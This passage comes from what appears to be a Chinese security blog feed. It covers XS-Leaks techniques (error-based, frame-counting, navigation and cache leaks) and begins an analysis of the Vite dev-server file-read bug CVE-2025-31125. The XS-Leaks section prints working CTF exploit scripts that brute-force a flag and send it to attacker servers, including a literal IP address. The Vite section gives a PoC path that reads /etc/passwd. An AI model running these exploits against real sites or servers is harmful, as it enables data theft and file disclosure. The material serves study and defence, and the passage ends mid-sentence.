class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Error-Based Attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        let currentFlag = &quot;nctf&#123;&quot;;</span><br><span class="line">        const chars = &quot;abcdef0123456789-&#123;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        function sleep(ms) &#123;</span><br><span class="line">            return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function checkCharacter(char) &#123;</span><br><span class="line">            return new Promise((resolve) =&gt; &#123;</span><br><span class="line">                let script = document.createElement(&#x27;script&#x27;);</span><br><span class="line">                script.src = `http://0.0.0.0:8000/internal/search?s=$&#123;currentFlag&#125;$&#123;char&#125;`;</span><br><span class="line"></span><br><span class="line">                script.onload = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(true);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                script.onerror = () =&gt; &#123;</span><br><span class="line">                    document.head.removeChild(script);</span><br><span class="line">                    resolve(false);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                document.head.appendChild(script);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        async function bruteforce() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                while (!currentFlag.endsWith(&#x27;&#125;&#x27;)) &#123;</span><br><span class="line">                    for (let char of chars) &#123;</span><br><span class="line">                        const isCorrect = await checkCharacter(char);</span><br><span class="line">                        if (isCorrect) &#123;</span><br><span class="line">                            currentFlag += char;</span><br><span class="line">                            window.open(`http://VPS:8000/?flag=$&#123;currentFlag&#125;`);</span><br><span class="line">                            await sleep(50);</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                        await sleep(50);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                window.open(`http://VPS:8000/?error=$&#123;currentFlag&#125;`);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bruteforce();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再来一个：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span><br><span class="line"><span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = url;</span><br><span class="line">script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://156.238.233.113:8000/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>:<span class="string">&#x27;no-cors&#x27;</span> &#125;);</span><br><span class="line"><span class="title function_">leak</span>(flag);</span><br><span class="line">script.<span class="title function_">remove</span>();</span><br><span class="line">&#125;;</span><br><span class="line">script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="keyword">let</span> char = dicts[i];</span><br><span class="line"><span class="title function_">probeError</span>(flag + char);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">leak</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="通过帧计数泄露"><a href="#通过帧计数泄露" class="headerlink" title="通过帧计数泄露"></a>通过帧计数泄露</h2><p><a href="https://xsleaks.dev/docs/attacks/frame-counting/">https://xsleaks.dev/docs/attacks/frame-counting/</a></p><p>通过获取帧的句柄，可以访问该帧的window.length属性，该属性用于检索窗口中的帧数（IFRAME 或 FRAME）。</p><p>这种知识有时会产生安全&#x2F;隐私影响。例如，网站可能会根据某些用户数据以不同的帧数呈现个人资料页面。</p><p>有几种方法可以获得窗口句柄。第一个是调用window.open，它返回句柄。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://example.com&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Waiting 3 seconds for page to load...&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%d FRAME/IFRAME elements detected.&#x27;</span>, win.<span class="property">length</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>另一种是对目标网站进行框架，并获取框架的句柄。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name=<span class="string">&quot;framecounter&quot;</span> src=<span class="string">&quot;https://www.example.com&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="property">frames</span>.<span class="property">framecounter</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Waiting 3 seconds for page to load...&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%d FRAME/IFRAME elements detected.&#x27;</span>, win.<span class="property">length</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;, <span class="number">3000</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里给出相关比赛的poc</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// contentWindow.frames.length</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~ &#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> charLen = chars.<span class="property">length</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ENDPOINT</span> = <span class="string">&quot;http://challenges.fbctf.com:8082/search?query=&quot;</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">leak, charCounter</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> curChar = chars[charCounter];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Chek if the character is valid</span></span><br><span class="line">    x.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&#x27;http://challenges.fbctf.com:8082/search?query=&#x27;</span> + leak + curChar);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leak = &quot;</span> + leak + curChar);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//When the page inside the iframe is loaded</span></span><br><span class="line">    x.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//检查页面中有多少个 iframe，如果有1个或多个，则说明当前枚举的字符是有效的。</span></span><br><span class="line">        <span class="keyword">if</span> (x.<span class="property">contentWindow</span>.<span class="property">frames</span>.<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://myserver/leak?&#x27;</span> + <span class="built_in">escape</span>(leak), &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span></span><br><span class="line">            &#125;);</span><br><span class="line">            leak += curChar</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">search</span>(leak, (charCounter + <span class="number">1</span>) % chars.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">search</span>(<span class="string">&quot;fb&#123;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">exploit</span>();</span><br></pre></td></tr></table></figure><h2 id="通过检测导航泄露"><a href="#通过检测导航泄露" class="headerlink" title="通过检测导航泄露"></a>通过检测导航泄露</h2><p><a href="https://xsleaks.dev/docs/attacks/navigations/">https://xsleaks.dev/docs/attacks/navigations/</a></p><p>检测跨站页面是否触发导航对攻击者来说很有用。例如，网站可能会根据用户的状态在某个端点触发导航。</p><p>为了检测是否发生了任何类型的导航，攻击者可以：</p><ul><li>使用并计算事件被触发的<code>iframe</code>次数。<code>onload</code></li><li>检查 的值<code>history.length</code>，该值可通过任何窗口引用访问。这提供了受害者历史记录中由<code>history.pushState</code>或常规导航更改的条目数。为了获取 的值<code>history.length</code>，攻击者将窗口引用的位置更改为目标网站，然后改回同源，最后读取该值。</li></ul><h2 id="通过浏览器缓存泄露"><a href="#通过浏览器缓存泄露" class="headerlink" title="通过浏览器缓存泄露"></a>通过浏览器缓存泄露</h2><p>当用户访问网站时，这些网站的资源通常会被缓存并存储在用户的磁盘上，因此不必再次下载。这节省了带宽，降低了服务器负载，并改善了用户体验。</p><p>不幸的是，基于时间和错误的 xsleak 变体可以利用这一点并确定用户之前是否访问过网站。</p><p>缓存时间变化很简单，为请求计时，如果是瞬时的，则资源被缓存。</p><p>基于错误的版本稍微复杂一些。它利用了缓存资源从未从服务器实际请求过的事实。因此，对缓存资源的无效 HTTP 请求不会引发异常（因为 Web 服务器永远没有机会拒绝它）。</p><h2 id="通过帧中的-ID-字段泄漏"><a href="#通过帧中的-ID-字段泄漏" class="headerlink" title="通过帧中的 ID 字段泄漏"></a>通过帧中的 ID 字段泄漏</h2><p><a href="https://xsleaks.dev/docs/attacks/id-attribute/">https://xsleaks.dev/docs/attacks/id-attribute/</a></p><h1 id="防止XS-Leaks"><a href="#防止XS-Leaks" class="headerlink" title="防止XS-Leaks"></a>防止XS-Leaks</h1><p>完全防止是不可能滴</p><ol><li>使用 SameSite 属性保护您的 cookie。</li><li>使用 Content-Security-Policy 和 X-Frame-Options 来防止框架。</li><li>考虑使用 Cache-Control 禁用缓存。</li><li>使用 fetch metadata headers 和 Vary header 来防止缓存探测。</li><li>实施跨域开放政策。</li><li>实施跨域资源策略。</li><li>实施隔离政策。</li></ol><p>参考文章：<a href="https://blog.csdn.net/allway2/article/details/126703565">https://blog.csdn.net/allway2/article/details/126703565</a></p><p><a href="https://www.cnblogs.com/starrys/p/15171221.html">https://www.cnblogs.com/starrys/p/15171221.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 侧信道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-31125)</title>
      <link href="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/"/>
      <url>/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>Affected versions</strong></p><ul><li>6.2.0 &lt;&#x3D; Vite &lt;&#x3D; 6.2.3</li><li>6.1.0 &lt;&#x3D; Vite &lt;&#x3D; 6.1.2</li><li>6.0.0 &lt;&#x3D; Vite &lt;&#x3D; 6.0.12</li><li>5.0.0 &lt;&#x3D; Vite &lt;&#x3D; 5.4.15</li><li>Vite &lt;&#x3D; 4.5.10</li></ul></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个漏洞其实是CVE-2025-30208的升级版</p><p>这里直接先给出公开的POC：<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><p>我们看看6.2.2，6.2.3，6.2.4，6.2.5版本的packages&#x2F;vite&#x2F;src&#x2F;node&#x2F;server&#x2F;middlewares&#x2F;transform.ts文件的commit先吧。</p><p>先看看修补6.2.2的commit：此处是修补了CVE-2025-30208，但是CVE-2025-31125仍然是存在的。</p><p><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188</a></p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403220258037.png" class="" title="图片引用方法一"><p>此处的修补其实主要在于去除末尾多的<code>?</code>和<code>&amp;</code>。</p><p>然后我们再看看修补6.2.3的commit</p><p><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403222124870.png" class="" title="图片引用方法一"><p>此处的修补主要是对于inlineRE的修补。也就是对上面那个公开POC的修补！但是未公开的POC还是可以使用的！！！！</p><p>再看看修补6.2.4的commit（下面分析的时候再说），修补了未公开的POC。。。</p><p><a href="https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7c">https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7c</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="公开POC"><a href="#公开POC" class="headerlink" title="公开POC"></a>公开POC</h3><p><code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><p>看看vite6.2.4</p><p>先看看最末尾的文件读取处：</p><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250403230132287.png" class="" title="图片引用方法一"><p>查看函数调用</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">pluginContext</span>: <span class="title class_">PluginContext</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; environment &#125; = pluginContext</span><br><span class="line">  <span class="keyword">if</span> (environment.<span class="property">config</span>.<span class="property">command</span> === <span class="string">&#x27;serve&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fileToDevUrl</span>(environment, id)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fileToBuiltUrl</span>(pluginContext, id)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续查看函数调用，全局搜发现load函数，其实这里也可以通过6.2.5的commit来发现6.2.4删除了<code>!id.endsWith(&#39;.wasm?init&#39;)</code>，换成了<code>!wasmInitRE.test(id)</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (id === wasmHelperId) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;wasmHelperCode&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!id.<span class="title function_">endsWith</span>(<span class="string">&#x27;.wasm?init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">import initWasm from &quot;<span class="subst">$&#123;wasmHelperId&#125;</span>&quot;</span></span><br><span class="line"><span class="string">export default opts =&gt; initWasm(opts, <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(url)&#125;</span>)</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>上述其实是满足id的末尾是<code>.wasm?init</code>的话，就进入fileToUrl。也就是结尾需要满足.wasm?init。</p><p>进入fileToUrl后会默认进入fileToDevUrl，就是在这里读取了file。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fileToDevUrl</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  skipBase = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> config = environment.<span class="title function_">getTopLevelConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> publicFile = <span class="title function_">checkPublicFile</span>(id, config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If has inline query, unconditionally inline the asset</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If is svg and it&#x27;s inlined in build, also inline it in dev to match</span></span><br><span class="line">  <span class="comment">// the behaviour in build due to quote handling differences.</span></span><br><span class="line">  <span class="keyword">if</span> (svgExtRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">shouldInline</span>(environment, file, id, content, <span class="literal">undefined</span>, <span class="literal">undefined</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">rtn</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="keyword">if</span> (publicFile) &#123;</span><br><span class="line">    <span class="comment">// in public dir during dev, keep the url as-is</span></span><br><span class="line">    rtn = id</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id.<span class="title function_">startsWith</span>(<span class="title function_">withTrailingSlash</span>(config.<span class="property">root</span>))) &#123;</span><br><span class="line">    <span class="comment">// in project root, infer short public path</span></span><br><span class="line">    rtn = <span class="string">&#x27;/&#x27;</span> + path.<span class="property">posix</span>.<span class="title function_">relative</span>(config.<span class="property">root</span>, id)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// outside of project root, use absolute fs path</span></span><br><span class="line">    <span class="comment">// (this is special handled by the serve static middleware</span></span><br><span class="line">    rtn = path.<span class="property">posix</span>.<span class="title function_">join</span>(<span class="variable constant_">FS_PREFIX</span>, id)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skipBase) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtn</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> base = <span class="title function_">joinUrlSegments</span>(config.<span class="property">server</span>.<span class="property">origin</span> ?? <span class="string">&#x27;&#x27;</span>, config.<span class="property">decodedBase</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">joinUrlSegments</span>(base, <span class="title function_">removeLeadingSlash</span>(rtn))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对id进行cleanUrl，也就是一次清洗（<strong>匹配从 <code>?</code> 或 <code>#</code> 开始直到字符串末尾的所有字符</strong>），如&#x2F;etc&#x2F;passwd?&amp;raw??会被替换为&#x2F;etc&#x2F;passwd。cleanUrl后读取文件！</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postfixRE = <span class="regexp">/[?#].*$/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cleanUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(postfixRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们用poc走一遍代码（vite6.2.4）。<code>/@fs/etc/passwd?import&amp;?inline=1.wasm?init</code></p><img 